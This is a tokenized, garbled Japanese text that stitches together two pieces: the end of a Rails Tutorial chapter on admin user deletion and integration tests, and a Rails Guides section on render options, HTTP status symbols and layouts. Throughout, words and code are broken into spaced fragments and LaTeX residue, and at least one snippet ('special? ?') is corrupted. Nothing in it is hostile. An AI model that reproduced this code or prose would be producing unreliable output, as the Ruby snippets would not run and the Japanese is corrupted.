▁このとき 、 リスト \ ref { code : action _ tests _ admin } では \ ko de { assert \_ no \_ difference } メソッド ▁( リスト \ ref { code : a _ test _ for _ invalid _ submission }) ▁ を使って 、 ユーザー 数 が 変 化 しない ことを確認 して いる点に注目してください 。
▁リスト \ ref { code : action _ tests _ admin } の テストでは 、 管理者 では ない ユーザーの 振る舞い について 検証 しています が 、 管理者 ユーザーの 振る舞い と 一 緒 に 確認 できる と よ さ そう です 。
▁ そこで 、 管理者 であれば ユーザー 一覧 画面 に 削除リンク が表示される 仕 様 を 利用 して 、 リスト \ ref { code : user _ index _ test } のテスト に 今回の テスト を追加して い く ことにします 。 これにより 、 後 ほど 追加 する 管理者 の 振る舞い についても 簡単に テストが 書 け そう です 。
▁ さ て 、 今回の テスト で 唯 一 の 手 の 込 んだ 箇所 は 、 管理者 が 削除リンク を クリック したときに 、 ユーザーが 削除 された ことを確認する 部分 です 。 今回は 次のような テスト で これを 実現 しました 。
▁ したがって 、 管理者 や 一 般 ユーザーの テスト 、 そして ページネーション や 削除リンク のテスト をすべて まとめ ると 、 リスト \ ref { code : delete _ link _ integration _ test } のようになります 。
▁ 削除リンク と ユーザー 削除 に対する 統合テスト
▁リスト \ ref { code : delete _ link _ integration _ test } では 各 ユーザーの 削除リンク をテストする ときに 、 ユーザーが 管理者 であれば スキップ している 点 にも 注目してください ▁( これはリスト \ ref { code : delete _ links } により 、 管理者 であれば 削除リンク が表示され ない からです )。
▁これで 、 削除 に関する コード に対して 、 よく テスト でき ている 状態 に なりました 。 テストスイート を 走 ら せる と ▁\ passing \ ▁ するはずです 。
▁\ ref { sec : user _ signup } で Users コントローラ を ご 紹 介 して 以 来 、 長 い 道 の り を た ど っ てきました 。
▁ あ の 頃 は ユーザー登録 す ら ありません で した が 、 今 は 登録 も ログイン も ログアウト も できます 。 プロフィール の 表示 も 、 設定 の 編集 も 、 すべての ユーザーの 一覧 画面 もあります 。 さらに 、 一部の ユーザー は 他の ユーザーを削除 すること す ら できるようになりました 。
▁ この時点で 、 サンプルアプリケーション は Web サイト として の 十分 な 基 盤 ▁( ユーザーを 認 証 したり 認 可 したり ) ▁ が 整 った と い え る でしょう 。
▁{0}{1} 第 10 章 {/1}{/0} では 、 さらに 2 つの 改 善 を加え ます 。 メールアドレス を使って アカウントを有効化する 機能 と ▁( す な わ ち 本当に 有効な メールアドレス か 検証 する プロセス と ) 、 ユーザーが パスワードを 忘れ て し ま った とき のための パスワード リセット 機能 です 。
▁ 次の 章 に進む前に 、 すべての 変更を master ブランチ に マージ しておきましょう 。
▁ アプリケーションを 本番 展開 したり 、 サンプルデータ を 本番 データ として 作成 することもできます ▁( 本番 データベース を リセット するには \ ko de { p g : reset } タスク を使用します )。
▁もちろん 、 実際の Web サイト では サンプルデータ を生成し たくない という 人 も いる か と思います が 、 これ には 理由 があります ▁( 図 \ ref { fig : heroku _ sample _ users })。
▁ それ は 、 図 \ ref { fig : heroku _ sample _ users } が 示す ように 、 サンプル ユーザーの 表示 順序 が 変 化 し てしまい 、 図 \ ref { fig : user _ index _ pagination } にある ような ローカル 環境で の 表示 順序 と 異 な っ てしまう ことです 。 これは 現時点では まだ デフォルトの 表示 順序 が 指定 されていない ことが 原 因 です 。 ▁ 結果 として 、 データベース の内容 に応じて 表示 順序 が 異 な ってしまいます 。
▁ それ だけ の こと か と 思 わ れる かもしれませんが 、 これは 今後 マイクロポスト を実装する ときに 問題 となります 。 なお 、 この問題 については \ ref { sec : order ing _ and _ dependency } で 解決 していきます 。
▁ 本番環境 の ユーザー一覧ページ
▁\ label { fig : heroku _ sample _ users } }< n >\ end { figure }< n >< n >\ subsection { 本 章 の まとめ } ▁% ▁( fold )< n >\ label { sec : updating _ what _ w e _ learn ed _ in _ this _ chapter }< n >< n >\ begin { item ize }< n >< n >\ item
▁ユーザー は 、 編集 フォーム から \ text tt { PATCH } リクエストを \ ko de { update } アクション に対して 送信 し 、 情報 を更新する
▁S trong ▁Parameters を使う ことで 、 安全 に Web 上 から 更新 させる ことができる
▁ before フィルター を使うと 、 特定の アクション が 実行される 直 前に メソッド を呼び出す ことができる
▁ before フィルター を使って 、 認 可 ▁( アクセス 制 御 ) ▁ を 実現 した
▁ 認 可 に対するテスト では 、 特定の HTTP リクエスト を直接 送信 する 低 級 な テスト と 、 ブラウザ の 操作 を シ ミ ュ レ ー ション する 高 級 な テスト ▁( 統合テスト ) ▁ の 2 つ を 利用 した
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング とは 、 ログイン 成功 時に 元 々 行 き た か った ページに 転 送 させる 機能 である
▁ ユーザー一覧ページ では 、 すべての ユーザーを ページ 毎 に 分割 して 表示する
▁\ ko de { rake ▁ db : s e ed } コマンド は 、\ ko de { db / s e ed s . rb } にある サンプルデータ を データベースに 流 し 込 む
▁ 論 理 属性 \ ko de { admin } を追加する と 、 自動的に \ ko de { user . admin ?} メソッドが 使えるように な る
▁ 管理者 が 削除 リンクをクリックすると 、\ text tt { DELETE } リクエスト が \ ko de { destroy } アクションに 向け て 送信 され 、 該当する ユーザーが 削除 される
▁ fixture ファイル 内で 埋め込み Ruby を使うと 、 多 量 のテスト ユーザー を作成する ことができる
▁ フ レ ンド リ ー フ ォ ワ ー デ ィ ング で 、 最初に 与えられた URL に のみ 確 実 に 転 送 されている ことを確認する テスト を作成 してください 。
▁ 続けて ログイン を 行った 後 、 転 送 先 の URL は デフォルト ▁( プロフィール画面 ) ▁ に 戻 る 必要 もあります ので 、 これ も テスト で 確認 してください 。
▁ レイアウト にある すべての リンク に対して 統合テスト を 書い てみましょう 。 ログイン 済み ユーザー と そう でない ユーザーの それぞれ に対して 、 正しい 振る舞い を 考え てください 。
▁\ emph { ヒント } : ▁{1} log _ in _ as {/1} ヘルパー を使って リスト { p 2 } に テストを 追加 してみましょう 。
▁Web 経由で \ text tt { admin } 属性 を変更 できない ことを確認 してください 。 \ ko de { {2} リスト 9 . 59 {/2} } に示したように 、 {3} PATCH {/3} リクエストを ▁\ text tt { update } メソッド に 直接 発行する テスト を作成 してください 。
▁このコードは リスト \ ref { code : new _ user _ with _ partial } で使用されていま した 。 もうひとつ 、
▁\ ko de { admin } 属性 の 変更 が 禁 止 されている こと をテストする
▁ new ビュー を パーシャル 化 する
▁ 本ガイドで は 、 Action ▁ Controller と Action ▁ View による 基本的な レイアウト 機能 について解説します 。
▁* ▁Rails に 組 み 込 まれ ている さまざまな レンダリング ▁( = レスポンス の 出力 ) ▁ 方法 の 使い 方
▁* ▁ コンテンツ が 複数の セクション から な る レイアウト 作成 法
▁* ▁ パーシャル を使用して ビュー を D R Y に する方法
▁* ▁ レイアウト を ネスト する方法 ▁( サブ テンプレート )
▁ 概 要 : ▁ 部品 を 組 み 上 げ る
▁ 本ガイドで は 、 コントローラ 、 ビュー 、 モデル によって 形 成 される 三 角 形 のうち 、 コントローラ と ビュー の 間 で の やりとり を 中 心 に 扱 います 。
▁ ご 存 じ のように 、 Rails の コントローラ は リクエスト を扱う プロセス 全体 の 流れ を 組 織 的に 調 整 する 責 任 を 負 い 、 ( ビ ジ ネ ス ロ ジ ッ ク のような ) ▁ 重 い 処理 は モデルの 方 で 行なう のが普通です 。
▁ モデル 側 で の 処理 が完了し 、 ユーザーに 結果 を表示する 時 が き たら 、 コントローラ は 処理 結果を ビュー に 渡します 。
▁このとき の 、 コントローラ から ビュー への 結果 の 渡 し 方 こ そ が 本 ガイド の 主 な トピック です 。
▁ 大きな 流れ として は 、 ユーザー への レスポンス として 送信 すべき 内容 を 決 定 すること と 、 ユーザー への レスポンス を作成する ために 適切な メソッド を呼び出す ことも この 作業 に 含 まれ ます 。
▁ ユーザーに 返す レスポンス 画面 を 完全な ビュー にする のであれば 、 Rails は その ビュー を さらに 別の レイアウト で ラ ッ ピ ング し 、 パーシャル ビュー として 取り出す でしょう 。
▁ 以後 本ガイドで は これらの 方法 をすべて 紹 介 します ( 訳 注 : ▁ 本ガイドで は render を 一般的な 意味 では 「 出力 」 、 具 体 的な 動作 を指す 場合は 「 レンダリング 」 と 訳 しています )。
▁ レスポンス を作成する
▁ コントローラ 側 から 見 ると 、 HTTP レスポンス の作成 方法は 以下の 3 とおり あります 。
▁* ▁` render ` を 呼び出し 、 ブラウザ に 返す 完全な レスポンス を作成する
▁* ▁` redirect _ to ` を 呼び出し 、 HTTP リダイレクト コード ステータス を ブラウザに送信 する
▁* ▁` head ` を 呼び出し 、 HTTP ヘッダー のみ で 構成 された レスポンス を作成して ブラウザに送信 する
▁### ▁ デフォルトの 出力 : ▁ アクション における 「 設定 より 規 約 」
▁Rails では 「 設定 より 規 約 ▁( Co C : ▁ con ve n tion ▁ o ver ▁config ur ation )」 という ポ リ シ ー が 推 奨 されている ことを ご 存 じ か と思います 。
▁ デフォルトの 出力結果 は 、 Co C の よい 例 で もあります 。
▁Rails の コントローラ は 、 デフォルトで は 正しい ルーティング に対応する 名前 を持つ ビュー を 自動的に 選 び 、 それ を使用して レスポンス を 出力 します 。
▁たとえば 、` Book sController ` という コントローラに 以下のコード が あるとします 。
▁class ▁ Book sController ▁< ▁ Application Controller
▁ ルーティング ファイルに 以下 が 記 載 されている とします 。
▁ resources ▁: books
▁` app / views / books / index . html . erb ` ビュー ファイル の内容 が 以下のように な っている とします 。
▁< h 1> Book s ▁are ▁ com ing ▁ s oo n !
▁ 以上 のように することで 、 ユーザーが ブラウザで ` / books ` にアクセス すると 、 Rails は自動的に ` app / views / books / index . html . erb ` ビュー を使用して レスポンス を 出力 し 、 その 結果 「 Book s ▁are ▁ com ing ▁ s oo n ! 」 という 文字 が 画面 に 表示 されます 。
▁しかし この 画面 だけで は ほとんど 実 用 性 が ないので 、` Book ` モデル を作成し 、` Book sController ` に index アクション を追加し てみましょう 。
▁@ books ▁= ▁ Book . all
▁上のコード で ご 注 目 い ただ き たい のは 、「 設定 より 規 約 」 の 原 則 が 利 い ている おかげで index アクション の最後 で 明示的に 画面 出力 を 指示 する必要が ない という 点 です 。
▁ここで の 原 則 は 、「 コントローラのアクション の 最 終 部分 で 明 示 的な 画面 出力 が 指示 されていない 場合は 、 コントローラ が 使用できる ビュー の パス から ` アクション 名 . html . erb ` という ビュー テンプレート を探し 、 それ を使用して 自動的に 出力 する 」 という ものです 。
▁従って 、 この場合は ` app / views / books / index . html . erb ` ファイルが 出力 されます 。
▁ ビューで すべての 本 の 属性を 表示 したい場合は 、 以下のように ERB を 書く ことができます 。
▁< h 1> L ist ing ▁ Book s </ h 1>
▁< th > S um m ary </ th >
▁< th ></ th >
▁<% ▁@ books . each ▁do ▁| book | ▁%>
▁< td > <%= ▁ book . title ▁%></ td >
▁< td > <%= ▁ book . content ▁%></ td >
▁< td > <%= ▁ link _ to ▁" S h o w ", ▁ book ▁%></ td >
▁< td > <%= ▁ link _ to ▁" Edit ", ▁ edit _ book _ path ( book ) ▁%></ td >
▁< td > <%= ▁ link _ to ▁" Re m o ve ", ▁ book , ▁ method : ▁: delete , ▁ data : ▁ { ▁ confirm : ▁" A re ▁you ▁ s ur e ? "
▁<%= ▁ link _ to ▁" New ▁ book ", ▁ new _ book _ path ▁%>
▁NOT E : ▁ 実際の レンダリング は 、` ActionView :: T e m p la te H and l er s ` の サブ クラス で 行われます 。
▁ 本ガイドで は レンダリング の詳細については 触 れ ません が 、 テンプレート ハ ンド ラ の 選択 が ビュー テンプレート ファイルの 拡張子 によって 制 御 されている という 重要な 点 は 理解 して おいてください 。
▁Rails ▁2 以降 における ビュー テンプレート の 標準 拡張子 は 、 ERB ▁( HTML ▁+ ▁ e M b ed de d ▁ R u B y ) ▁ で レンダリング する 場合は ` . erb ` 、 B u il de r ▁( XML ジェネレータ ) ▁ で レンダリング する 場合は ` . builder ` です 。
▁### ▁` render ` を使用する
▁ アプリケーション が ブラウザで 表示する コンテンツ の レンダリング ▁( 出力 ) ▁という 力 仕 事 は 、` ActionController :: Base # render ` メソッドが ほぼ 一 手 に 引 き 受け ています 。
▁` render ` メソッドは さまざまな 方法で カスタマイズ できます 。
▁Rails テンプレート の デフォルト ビュー を出力する こともできます し 、 特定の テンプレート 、 ファイル 、 イン ラ イン コード を指定して 出力 したり 、 何も 出力 しない こともできます 。
▁ テキスト 、 JSON 、 XML を出力する こともできます 。
▁ 出力 される レスポンス の content ▁type や HTTP ステータス を指定する こともできます 。
▁ TIP : ▁ 出力結果 を ブラウザで 表示 して 調 べ ること なく 、` render ` 呼び出し の 正 確 な 結果を 取得 したい場合は 、` render _ to _ string ` を呼び出す ことができます 。
▁このメソッド の動作 は ` render ` と 完全に 同じ であり 、 出力結果 を ブラウザ に 返 さ ずに 文字列 を返す 点 だけ が 異なります 。
▁#### ▁ 何も 出力 しない 方法
▁` render ` メソッドで できる 最も 単純な 動作 は 、 何も 出力 しない ことでしょう 。
▁render ▁ not h ing : ▁true
▁この レスポンス を c url コマンド を使用して 調 べ てみると 以下の ようになっています 。
▁$ ▁c url ▁- i ▁1 27 . 0.0 . 1 :3000/ books
▁ HTTP /1 . 1 ▁ 200 ▁ O K
▁ Connection : ▁c lo s e
▁ Date : ▁Sun , ▁2 4 ▁ J an ▁2010 ▁0 9 : 2 5 : 18 ▁ G M T
▁ Content - Type : ▁* / * ; ▁ cha r set = u t f - 8
▁X - R un time : ▁ 0.0 14 2 9 7
▁S e t - Co o k i e : ▁ _ blog _ session = ... s n ip ... ; ▁ path = / ; ▁ H tt p O n ly
▁ Cache - Control : ▁ no - cache
▁ レスポンス の内容 は 空 欄 になっています ▁( ` Cache - Control ` 行 以降 に データ がない ) ▁ が 、 ステータス コ ート が 200 ▁ O K になっている ので リクエスト が 成功 している ことがわかります 。
▁ 何も 出力 しない という レスポンス は 、 Ajax リクエスト を使用する 時に 便利です 。 これ を使用することで 、 リクエスト が 成功 した という 確認 応答 だけ を ブラウザ に 送 り 返す ことができる からです 。
▁ TIP : ▁ 200 ▁ O K ヘッダー だけ を送信し たい のであれば 、 ここで ご 紹 介 した ` render ▁: not h ing ` よりも 、 本ガイドで 後 述 する ` head ` メソッド を使用する 方が おそらく よいでしょう 。
▁` head ` メソッドは ` render ▁: not h ing ` よりも 柔 軟 性 が 高 く 、 HTTP ヘッダー だけ を生成し ている ことが 明 確 になる からです 。
▁#### ▁Action ▁ View を出力する
▁ 同じ コントローラ で 、 デフォルト と 異なる テンプレート に対応する ビュー を 出力 したい場合は 、` render ` メソッドで ビュー 名 を指定する ことができます 。
▁@ book ▁= ▁ Book . find ( params [: id ] )
▁if ▁@ book . update ( book _ params )
▁ redirect _ to (@ book )
▁render ▁" edit "
▁上の ` update ` アクション で モデル に対する ` update ` メソッドの 呼び出し が 失敗する と 、 同じ コントローラに 用 意 して お いた 別の ` edit . html . erb ` テンプレート を使用して 出力 します 。
▁ 出力 する アクション を指定する には 、 文字列 の 他 に シンボル を使用する こともできます 。
▁render ▁: edit
▁#### ▁ 別の コントローラ から アクション の テンプレート を出力する
▁ ある コントローラのアクション から 、 まったく 別の コントローラの 配 下 にある テンプレート を使用して 出力 すること は 可能 でしょう か 。
▁これ も ` render ` メソッド だけで 行なう ことができます 。 ` render ` メソッド には ` app / views ` を 起 点 と する フル パス を 渡す ことができます ので 、 出力 したい テンプレート を フル パス で 指定 します 。
▁たとえば 、` app / controllers / admin ` に置かれている ` Admin Product s ` コントローラの コードを 実行 している と すると 、` app / views / products ` に置かれている ビュー テンプレート に対する アクション の 実行 結果を 出力 するには 以下のように します 。
▁render ▁" products / show "
▁ パス に ス ラ ッ シ ュ ` / ` が含まれ ている と 、 Rails によって この ビュー は 異なる コントローラの 配 下 にある と 認 識 されます 。
▁ 異なる コントローラの テンプレート を指定して いる ことを より 明示的に したい場合は 、 以下のように `: template ` オプション を使用する こともできます ▁( Rails ▁2 . 2 以前 では この オプションは 必 須 で した )。
▁render ▁ template : ▁" products / show "
▁#### ▁ 任意の ファイル を使用して 出力 する
▁render ▁ file : ▁" / u / app s / w ar e h o us e _ app / current / app / views / products / show "
▁`: file ` オプション に 与え る パス は 、 ファイル システム の 絶 対 パス です 。
▁ 当 然 ながら 、 コンテンツ を 出力 したい ファイル に対して 適切な アクセス 権 が与えられ ている 必要があります 。
▁ TIP : ▁ M i c r o s of t ▁ Windows 上で Rails を実行し ている 場合 、 ファイル を出力する 際に `: file ` オプション を省略 できません 。 Windows の ファイル名 フォーマット は Unix の ファイル名 と同じ では ない ためです 。
▁#### ▁ まとめ
▁ これまで ご 紹 介 した 3 通 り の 出力 方法 ▁( コントローラ 内の 別 テンプレート を使用 、 別の コントローラの テンプレート を使用 、 ファイル システム 上の 任意の ファイルを 使用 ) ▁ は 、 実際には 同 一 の アクション の バ リ エ ー ション に す ぎ ません 。
▁ 実 の ところ 、 たとえば Book sController クラスの update アクション 内で 、 本 の 更新 に 失敗した ら edit テンプレート を 出力 したい と すると 、 以下の どの レンダリング 呼び出し を行って も 最終的に は 必ず ` views / books ` ディレクトリ の ` edit . html . erb ` を使用して 出力 が 行われます 。
▁render ▁: edit
▁render ▁ action : ▁: edit
▁render ▁" edit "
▁render ▁" edit . html . erb "
▁render ▁ action : ▁" edit "
▁render ▁ action : ▁" edit . html . erb "
▁render ▁" books / edit "
▁render ▁" books / edit . html . erb "
▁render ▁ template : ▁" books / edit "
▁render ▁ template : ▁" books / edit . html . erb "
▁render ▁" / path / to / rails / app / views / books / edit "
▁render ▁" / path / to / rails / app / views / books / edit . html . erb "
▁render ▁ file : ▁" / path / to / rails / app / views / books / edit "
▁render ▁ file : ▁" / path / to / rails / app / views / books / edit . html . erb "
▁ どの 呼び出し を使用する か は コ ー デ ィ ング の スタイル と 規 則 の 問題 で しか ありません が 、 経験 上 なるべく シンプルな 記 法 を使用する 方が コードが わかりやすく な る でしょう 。
▁#### ▁` render ` で `: in line ` オプション を使用する
▁` render ` メソッドは 、 メソッド 呼び出し の 際に `: in line ` オプション を使用して ERB を与える と 、 ビュー が まったく ない 状態 でも 実行 することができます 。
▁これは 完全に 有効な 方法 です 。
▁render ▁in line : ▁" < % ▁ products . each ▁do ▁| p | ▁% >< p > <%= ▁ p . name ▁%></ p >< % ▁end ▁%> "
▁WARN ING : ▁この オプションを 実際に 使用する 意味 は ほぼ ない と 思 わ れ ます 。
▁ コントローラ のコード に ERB を 混 在 させる と 、 Rails の MVC 指 向 が 崩 される だけで なく 、 開発者 が プロジェクト の ロ ジ ッ ク を 追 い かけ ること が 困 難 になってしまい ます 。
▁ 通常の ERB ビュー を使用して ください 。
▁ イン ラ イン では 、 デフォルトで ERB を使用して 出力 を行います 。
▁`: type ` オプション で : builder を指定すると 、 ERB に 代 え て B u il de r が使用されます 。
▁render ▁in line : ▁" xml . p ▁ { ' H or r id ▁ co d ing ▁ p r a c tic e ! ' } ", ▁type : ▁: builder
▁#### ▁ テキスト を出力する
▁` render ` で `: plain ` オプション を使用すると 、 平 文 テキスト を マークアップ せずに ブラウザに送信 することができます 。
▁render ▁ plain : ▁" O K "
▁ TIP : ▁ 平 文 テキスト の 出力 は 、 Ajax や Web サービス リクエスト に応答する ときに 最も 有 用 です 。 これら では HTML 以外の 応答 を 期 待 しています 。
▁NOT E : ▁ デフォルトで は 、`: plain ` オプション を使用すると 出力結果 に 現在の レイアウト が 適 用 されません 。
▁#### ▁ HTML を出力する
▁` render ` で `: html ` オプション を使用すると 、 HTML 文字列 を直接 ブラウザに送信 することができます 。
▁render ▁ html : ▁" < strong > No t ▁F ound </ strong > ". html _ safe
▁ TIP : ▁この 手法 は 、 HTML コードの ご く 小 規 模 な ス ニ ペ ッ ト を 出力 したい場合 に 便利です 。
▁ ス ニ ペ ッ ト の マークアップ が 複 雑 になる よう であれば 、 早 め に テンプレート ファイルに 移 行 すること を ご 検 討 ください 。
▁#### ▁ JSON を出力する
▁ JSON は JavaScript の データ 形式 の 一 種 で 、 多くの Ajax ライブラリ で使用されていま す 。
▁Rails では 、 オブジェクト から JSON 形式 への 変 換 と 、 変 換 された JSON を ブラウザに送信 する 機能 が ビルトイン で サポート されています 。
▁render ▁ json : ▁@ product
▁ TIP : ▁ 出力 する オブジェクト に対して ` to _ json ` を呼び出す 必要はありません 。
▁`: json ` オプション が 指定 され ていれば 、` render ` によって ` to _ json ` が自動的に 呼び出される ようになっています 。
▁#### ▁ XML を出力する
▁Rails では 、 オブジェクト から XML 形式 への 変 換 と 、 変 換 された XML を ブラウザに送信 する 機能 が ビルトイン で サポート されています 。
▁render ▁ xml : ▁@ product
▁ TIP : ▁ 出力 する オブジェクト に対して ` to _ xml ` を呼び出す 必要はありません 。
▁`: xml ` オプション が 指定 され ていれば 、` render ` によって ` to _ xml ` が自動的に 呼び出される ようになっています 。
▁#### ▁ V a nil la ▁ JavaScript を出力する
▁Rails は v a nil la ▁ JavaScript を出力する こともできます 。
▁render ▁ js : ▁" alert (' Hello ▁Rails ') ; "
▁上のコードは 、 引数 で 与えられた 文字列を M I M E タイプ ` text / javascript ` で ブラウザに送信 します 。
▁#### ▁ 生 の コンテンツ を出力する
▁` render ` で `: body ` オプション を指定する ことで 、 content ▁type を 一 切 指定 しない 生 の コンテンツ を ブラウザに送信 することができます 。
▁render ▁ body : ▁" raw "
▁ TIP : ▁この オプション を使用する のは 、 レスポンス の content ▁type が どんな もの であっても よい 場合 のみ に してください 。
▁ ほとんど の場合 、`: plain ` や `: html ` など を使用する 方が 適 切 です 。
▁#### ▁` render ` の オプション
▁` render ` メソッド に対する 呼び出し では 、 一般に 以下の 4 つの オプション が 使用できます 。
▁* ▁`: content _ type `
▁* ▁`: layout `
▁* ▁`: location `
▁* ▁`: status `
▁#### # ▁`: content _ type ` オプション
▁Rails が デフォルトで 出力 する 結果 の M I M E ▁ content - type は 、 デフォルトで ` text / html ` になります ▁( ただし `: json ` を 指定 した 場合には ` application / json `、` : xml ` を使用した 場合は ` application / xml ` になります )。
▁ content - type を変更 したい場合は 、`: content _ type ` オプション を指定します 。
▁render ▁ file : ▁ file name , ▁ content _ type : ▁" application / r s s "
▁#### # ▁`: layout ` オプション
▁` render ` で 指定 できる ほとんど の オプション では 、 出力 される コンテンツ は 現在の レイアウト の一部 として ブラウザ 上で 表示 されます 。
▁これ より 、 レイアウト の詳細 と 利用 法 について 本ガイドで 説明します 。
▁`: layout ` オプション を指定すると 、 現在の アクション に対して 特定の ファイルを レイアウト として 使用します 。
▁render ▁ layout : ▁" special _ layout "
▁ 出力 時に レイアウト を まったく 使用 しない よう 指定 することもできます 。
▁render ▁ layout : ▁false
▁#### # ▁`: location ` オプション
▁`: location ` を使用することで 、 HTTP の ` L o c ation ` ヘッダー を 設定 できます 。
▁render ▁ xml : ▁ photo , ▁ location : ▁ photo _ url ( photo )
▁#### # ▁`: status ` オプション
▁Rails が 返す レスポンス の HTTP ステータス コード は自動的に 生成されます ▁( ほとんど の場合 ` 200 ▁ O K ` となります )。
▁`: status ` オプション を使用することで 、 レスポンス の ステータス コードを 変更 できます 。
▁render ▁ status : ▁5 00
▁render ▁ status : ▁: for b id de n
▁ ステータス コードは 数字 で 指定 する 他 に 、 以下 に 示す シンボル で 指定 することもできます 。
▁| ▁ レスポンス クラス ▁| ▁ HTTP ステータス コード ▁| ▁ シンボル ▁|
▁| ▁ ---- --------------- ▁| ▁ ---------------- ▁| ▁ ---------------- ---------------- ▁|
▁| ▁** In form ation al ** ▁| ▁ 100 ▁| ▁: con t in u e ▁|
▁| ▁| ▁10 1 ▁| ▁: s w it ch ing _ proto c ol s ▁|
▁| ▁| ▁10 2 ▁| ▁: process ing ▁|
▁| ▁** S u c c ess ** ▁| ▁ 200 ▁| ▁: o k ▁|
▁| ▁| ▁20 1 ▁| ▁: created ▁|
▁| ▁| ▁20 2 ▁| ▁: accept ed ▁|
▁| ▁| ▁20 3 ▁| ▁: n on _ author it at ive _ information ▁|
▁| ▁| ▁20 4 ▁| ▁: no _ content ▁|
▁| ▁| ▁20 5 ▁| ▁: reset _ content ▁|
▁| ▁| ▁20 6 ▁| ▁: partial _ content ▁|
▁| ▁| ▁20 7 ▁| ▁: m ulti _ status ▁|
▁| ▁| ▁20 8 ▁| ▁: al read y _ re port ed ▁|
▁| ▁| ▁ 22 6 ▁| ▁: im _ us ed ▁|
▁| ▁** Re d ir ec tion ** ▁| ▁3 00 ▁| ▁: m ulti p le _ ch o i ce s ▁|
▁| ▁| ▁ 30 1 ▁| ▁: m o v ed _ per ma n ent ly ▁|
▁| ▁| ▁ 30 2 ▁| ▁: f ound ▁|
▁| ▁| ▁ 30 3 ▁| ▁: s e e _ other ▁|
▁| ▁| ▁3 04 ▁| ▁: not _ mod ified ▁|
▁| ▁| ▁ 30 5 ▁| ▁: us e _ pro x y ▁|
▁| ▁| ▁3 06 ▁| ▁: re s er v ed ▁|
▁| ▁| ▁3 07 ▁| ▁: te m p or ary _ redirect ▁|
▁| ▁| ▁3 08 ▁| ▁: per ma n ent _ redirect ▁|
▁| ▁** Client ▁ Error ** ▁| ▁4 00 ▁| ▁: b ad _ request ▁|
▁| ▁| ▁4 0 1 ▁| ▁: un author ize d ▁|
▁| ▁| ▁4 0 2 ▁| ▁: p a y m ent _ require d ▁|
▁| ▁| ▁4 0 3 ▁| ▁: for b id de n ▁|
▁| ▁| ▁4 04 ▁| ▁: not _ f ound ▁|
▁| ▁| ▁4 0 5 ▁| ▁: method _ not _ allow ed ▁|
▁| ▁| ▁4 06 ▁| ▁: not _ accept able ▁|
▁| ▁| ▁4 07 ▁| ▁: pro x y _ authentication _ require d ▁|
▁| ▁| ▁4 08 ▁| ▁: request _ time out ▁|
▁| ▁| ▁4 0 9 ▁| ▁: con f li ct ▁|
▁| ▁| ▁4 10 ▁| ▁: g one ▁|
▁| ▁| ▁4 11 ▁| ▁: length _ require d ▁|
▁| ▁| ▁4 12 ▁| ▁: pre con d i tion _ failed ▁|
▁| ▁| ▁4 1 3 ▁| ▁: request _ ent ity _ to o _ l ar g e ▁|
▁| ▁| ▁4 14 ▁| ▁: request _ ur i _ to o _ lo n g ▁|
▁| ▁| ▁4 15 ▁| ▁: un support ed _ media _ type ▁|
▁| ▁| ▁4 16 ▁| ▁: request ed _ range _ not _ s at is fi able ▁|
▁| ▁| ▁4 17 ▁| ▁: ex p e ct ation _ failed ▁|
▁| ▁| ▁4 22 ▁| ▁: un process able _ ent ity ▁|
▁| ▁| ▁4 23 ▁| ▁: lock ed ▁|
▁| ▁| ▁4 2 4 ▁| ▁: failed _ dependency ▁|
▁| ▁| ▁4 2 6 ▁| ▁: up gra de _ require d ▁|
▁| ▁| ▁4 28 ▁| ▁: pre con d i tion _ require d ▁|
▁| ▁| ▁4 2 9 ▁| ▁: to o _ many _ request s ▁|
▁| ▁| ▁4 3 1 ▁| ▁: request _ header _ field s _ to o _ l ar g e ▁|
▁| ▁** S er ver ▁ Error ** ▁| ▁5 00 ▁| ▁: internal _ server _ error ▁|
▁| ▁| ▁ 50 1 ▁| ▁: not _ im p le m ent ed ▁|
▁| ▁| ▁ 50 2 ▁| ▁: b ad _ g at e w a y ▁|
▁| ▁| ▁ 50 3 ▁| ▁: s er v i ce _ un available ▁|
▁| ▁| ▁5 04 ▁| ▁: g at e w a y _ time out ▁|
▁| ▁| ▁ 50 5 ▁| ▁: http _ version _ not _ support ed ▁|
▁| ▁| ▁5 06 ▁| ▁: v ar i an t _ al s o _ n e g o t i at es ▁|
▁| ▁| ▁5 07 ▁| ▁: in s u f fi c i ent _ st or age ▁|
▁| ▁| ▁5 08 ▁| ▁: lo o p _ de te ct ed ▁|
▁| ▁| ▁5 10 ▁| ▁: not _ ext end ed ▁|
▁| ▁| ▁5 11 ▁| ▁: net w or k _ authentication _ require d ▁|
▁#### ▁ レイアウト の 探 索 順序
▁Rails は 現在の レイアウト を 探 索 する 場合 、 最初に 現在の コントローラ と同じ 基本 名 を持つ レイアウト が ` app / views / layouts ` ディレクトリ にある かどうか を調べ ます 。
▁たとえば 、` P h o to sController ` クラスの アクション から 出力 する のであれば 、` app / views / layouts / photos . html . erb ` または ` app / views / layouts / photos . builder ` を探し ます 。
▁ 該 当 の コントローラに 属 する レイアウト が ない場合 、` app / views / layouts / application . html . erb ` または ` app / views / layouts / application . builder ` を使用します 。
▁` . erb ` レイアウト が ない場合 、` . builder ` レイアウト があれば それ を使用します 。
▁Rails には 、 各 コントローラ や アクションに 割り当て る 特定の レイアウト を もっと 正 確 に 指定 する方法 が い く つ も 用意されてい ます 。
▁#### # ▁ コントローラ 用の レイアウト を指定する
▁` layout ` 宣言 を使用することで 、 デフォルトの レイアウト 名 ルール を 上 書き することができます 。
▁class ▁ Product sController ▁< ▁ Application Controller
▁ layout ▁" in ve n to ry "
▁# ...
▁この 宣言 によって 、` Product sController ` から の 出力 で 使用される レイアウト は ` app / views / layouts / in ve n to ry . html . erb ` になります 。
▁ アプリケーション 全体 で 特定の レイアウト を使用したい場合 は 、` Application Controller ` クラス で ` layout ` を 宣言 します 。
▁class ▁ Application Controller ▁< ▁ ActionController :: Base
▁ layout ▁" main "
▁この 宣言 によって 、 アプリケーションの すべての ビューで 使用される レイアウト は ` app / views / layouts / main . html . erb ` になります 。
▁#### # ▁ 実行 時に レイアウト を指定する
▁ レイアウト の 指定 に シンボル を使用することで 、 リクエスト が 実際に 処理 される とき まで レイアウト を 確 定 せ ず 、 選択 を 遅 延 することができます 。
▁ layout ▁: products _ layout
▁@ product ▁= ▁ Product . find ( params [: id ] )
▁def ▁ products _ layout
▁@ current _ user . special ? ▁ ?
▁" special " ▁: ▁" products "
▁上のコードは 、 現在のユーザー が 特別な ユーザー の場合 、 その ユーザーが 製 品 ページ を見ると き に 特別な レイアウト を 適 用 します 。
▁ レイアウト を 決 定 する 際に 、 Proc などの イン ラ イン メソッド を使用する こともできます 。
